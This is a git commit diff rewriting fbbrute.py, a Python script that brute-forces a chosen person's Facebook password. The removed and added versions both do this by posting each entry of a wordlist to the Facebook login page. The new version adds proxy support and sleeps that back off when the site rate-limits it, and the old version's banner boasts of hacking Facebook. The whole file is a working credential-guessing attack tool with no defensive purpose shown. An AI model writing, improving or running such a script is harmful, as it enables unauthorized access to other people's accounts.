8802f3050b4fc6884c21e588273922d2e6ae1331
vigneshpbg95 <49304897+vigneshpbg95@users.noreply.github.com>
2019-04-27 12:03:07 +0800

    Update fbbrute.py

--- fbbrute.py
+++ fbbrute.py
@@ -1,189 +1,136 @@
-#!usr
-# -*- coding: UTF-8 -*-
-# Mod by: vigneshpbg95
-# team: life of programmer
+_Author_="Joychondroghosh@gmail.com"
+__version__ = "0.1Joy"
 
-
-import os
-import sys
 import time
-import random
-import cookielib
+import getopt
+import sys
+import httplib
+import urllib
+import re
+
+HEADERS = {
+    "Content-type": "application/x-www-form-urlencoded", 
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1",
+#    "Accept-Encoding": "gzip, deflate",
+    "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+    "Cookie": "locale=es_LA"
+}
+
+DATA = {
+    "return_session": 0, 
+    "legacy_return": 1, 
+    "display": "", 
+    "session_key_only": 0, 
+    "trynum": 1, 
+    "timezone": 360, 
+    "persistent": 1, 
+    "default_persistent": 1, 
+    "login": "Entrar"
+}
+
+def main(argv):
+    error, options = parse_args(argv)
+
+    if error or "help" in options:
+        usage()
+        return
+
+    DATA["email"] = options["username"]
+
+    host = "www.facebook.com"
+    port = 80
+    resource = "/login.php"
+
+    if "proxy" in options:
+        host, port = options["proxy"].split(":")
+        resource = "http://www.facebook.com/login.php"
+    
+    running = True
+    waiting = False
+    found = False
+    count = 1
+
+    while running:
+        if not waiting:
+            count = 1
+            passwd = unicode(options["passdb"].readline().strip(), options["encoding"])
+
+        if not passwd:
+            break
+
+        try:
+            waiting = False
+            print "Trying: {0}".format(passwd.encode(options["encoding"]))
+
+            
+            conn = httplib.HTTPConnection(host, port)
+
+            # needs to be encoded in utf-8 for urlencode
+            DATA["pass"] = passwd.encode("utf-8")
+            params = urllib.urlencode(DATA)
+
+            conn.request("POST", resource, params, HEADERS)
+            response = conn.getresponse()
+
+            response = response.read()
+            conn.close()
+            
+            if len(response.strip()) == 0:
+                found = True
+                print "SUCCESS: {0}".format(passwd.encode(options["encoding"]))
+                break
+            elif response.find("menudo") != -1:
+                waiting = True
+                print "Waiting..."
+                time.sleep(60 * count)
+
+                count += 1
+        except Exception, err:
+            print "An error ocurred: ", str(err)
+
+    if not found:
+        print "FAILED: Password list Doesen't have Matching Password Use Another list!"
+
+def parse_args(argv):
+    options = { "encoding": "utf-8" }
+    error = False
+
+    try:
+        opts, args = getopt.getopt(argv, "u:p:e:P:h", ["username=", "passdb=", "encoding=", "proxy=", "help"])
+
+        for opt, arg in opts:
+            if opt in ("-u", "--username"):
+                options["username"] = arg
+            elif opt in ("-p", "--passdb"):
+                options["passdb"] = open(arg)
+            elif opt in ("-e", "--encoding"):
+                options["encoding"] = arg
+            elif opt in ("-P", "--proxy"):
+                if not re.search("^(\w+|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):\d+$", arg):
+                    raise Exception("Invalid format for proxy, should be host:port")
+
+                options["proxy"] = arg
+            elif opt in ("-h", "--help"):
+                options["help"] = True
+            else:
+                error = True
+    except Exception, err:
+        error = True
+        print str(err)
+
+    if "username" not in options or "passdb" not in options:
+        error = True
+        
+    return error, options
+
+def usage():
+    print """Fb Bruteforce Tool By Joy Ghosh Works On Windows Also
 
 
-wd = "\033[90;1m" # dark
-GL = "\033[96;1m" # Blue aqua
-BB = "\033[34;1m" # Blue light
-YY = "\033[33;1m" # Yellow light
-GG = "\033[32;1m" # Green light
-WW = "\033[0;1m"  # White light
-RR = "\033[31;1m" # Red light
-CC = "\033[36;1m" # Cyan light
-B = "\033[34m"    # Blue
-Y = "\033[33;1m"    # Yellow
-G = "\033[32m"    # Green
-W = "\033[0;1m"     # White
-R = "\033[31m"    # Red
-C = "\033[36;1m"    # Cyan
+How to Use:
 
-def runntxt(s):
-        for noobs in s + '\n':
-                sys.stdout.write(noobs)
-                sys.stdout.flush()
-                time.sleep(10. / 2100)
+fb.py -u (Username) -p (password list name) [-e encoding] [-P proxy:port]""".format(__version__)
 
-
-def banner():
-    os.system('clear')
-    print " "
-    runntxt(GL+"              welcome To vickyHackz ^_^")
-    runntxt(WW+"                 \\          //   ")
-    runntxt(WW+"                  \\        //    ")
-    runntxt(GL+"                   \\      //     ")
-    runntxt(GG+"                    \\    //       ")
-    runntxt(Y+"                      \\  //       ")
-    runntxt(GG+"                      \\//         ")
-    time.sleep(1.5)
-    print GG+"  √=============================================√"
-    print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
-    print GG+"  √=============================================√"
-    print WW+"  |            MOD BY: vigneshpbg95             |"
-    print GL+"  |       Berdoa Dulu Sebelum Menggunakan       |"
-    print WW+"  |            FACEBOOK: vigneshwaran muthukumaran           |"
-    print Y+"  |             INSTAGRAM: vigneshwaran.muthukumaran            |"
-    print GL+"  |---------------------------------------------|"
-    print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]         |"
-    print GL+"  |---------------------------------------------|"
-    print GG+"  √=============================================√"
-    print GL+"  |•••••••••   HACK FACEBOOK MAS ^_^   •••••••••|"
-    print GG+"  √=============================================√"
-
-banner()
-
-print wd+"         https://www.github.com/vigneshpbg95"
-print GG+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
-email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
-print " "
-print "\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[91;1m]"
-password_list = str(raw_input(GG+"╰────➲\033[93m "))
-login = 'https://www.facebook.com/login.php?login_attempt=1'
-useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
-# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]
-
-def pil():
-                print GG+" "
-                g = str(raw_input("[?] Hack Fb lagi..\033[93;1m[y/n]: "))
-                if g == 'y' or g == 'Y':
-                    os.system('python2 brute.py')
-                elif g == 'n' or g == 'N':
-                    print wd+"Keluar dari program..."
-                    sys.exit()
-                else:
-                    print RR+"Pilih yang bener cuk..."
-                    pil()
-
-def edit_wordlist():
-
-        print GG+" "
-        ed = str(raw_input("[?] Edit wordlist cuk.? \033[96;1m[y/n]: "))
-        if ed == 'y' or ed == 'Y':
-                os.system('nano '+password_list)
-                pil()
-        elif ed == 'n' or ed == 'N':
-                print wd+"Keluar Dari Program..."
-                sys.exit()
-
-        else:
-                print RR+"Pilih yg bener cuk..."
-                edit_wordlist()
-
-def main():
-        global noobs
-        noobs = mechanize.Browser()
-        cj = cookielib.LWPCookieJar()
-        noobs.set_handle_robots(False)
-        noobs.set_handle_redirect(True)
-        noobs.set_cookiejar(cj)
-        noobs.set_handle_equiv(True)
-        noobs.set_handle_referer(True)
-        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-        runn_noobs()
-        life()
-        print " "
-        print RR+" wordlist tidak ada yg cocok..."
-        print " "
-def iqbalz(iqbalz_password):
-  try:
- 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
-	sys.stdout.flush()
-	noobs.addheaders = [('User-agent', random.choice(useragents))]
-	site = noobs.open(login)
-	noobs.select_form(nr = 0)
-	noobs.form['email'] = email_target
-	noobs.form['pass'] = iqbalz_password
-	tom = noobs.submit()
-	mask = tom.geturl()
-	if mask != login and (not 'login_attempt' in mask):
-                        print " "
-			print ("\033[96m                S U C C E S S")
-			print "          P A S S W O R D  F I N D "
-                  	print RR+"+-------------------------------------------+"
-	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
-        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
-        	        print " "
-        	        raw_input(WW+"TEKAN ENTER UNTUK KELUAR...")
-			sys.exit(1)
-  
-  
-  except KeyboardInterrupt:
-      print wd+"Stop......."
-      edit_wordlist()
-      sys.exit()    	    
-def life():
-	global iqbalz_password
-	password_nob = open(password_list, "r")
-	for iqbalz_password in password_nob:
-		password_nob = iqbalz_password.replace("\n","")
-		iqbalz(iqbalz_password)		
-
-def runn_noobs():
-         global password_list
-
-         lop = GG+"""
-                  `.-://////:-.`
-              .:+o+:-..````..-:+o+:.
-           `:o+-`                `:+o:`
-         `/o:`                      `:o/`
-        -s/`  .-..`            `..--` `/s-
-       /o.   `:.`.-:----------:-.``:-   .o/
-      /o`    .:`    `              --    `o/
-     -s.     .:`                   --     .s-
-     o/     .:`                     --     +o
-    .s-     :.                      `:`    -s`
-    .s.     :.                      `:`    .s.
-    .s-     --                      .:     -s.
-     o/     `-.                    `-.     /o
-     -s.     `--`                `.-`     .s-
-      /o` ----``..--..`    `...--.`      `o/
-       /o. `----`  `-.      `-.         .o/
-        -o:  -.......        ..       `:o-
-         `:o:``....--        ..     `:o:`
-           `:+/-`  `-        ..  `-/+:`
-              `-/+///..````..://+/-`
-                  `.-::////::-.` \033[91;1m
-                \033[90;1mLife Of Programmer\033[91;1m
-             Powered by:\033[97m vigneshpbg95
-      """
-
-
-         print lop
-         nuub = open(password_list, 'r')
-         nuub = nuub.readlines()
-         print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
-         print wd+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
-         print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
-         print " "
-
-if __name__=='__main__':
-	main()	
-
+if __name__ == "__main__":
+    main(sys.argv[1:])
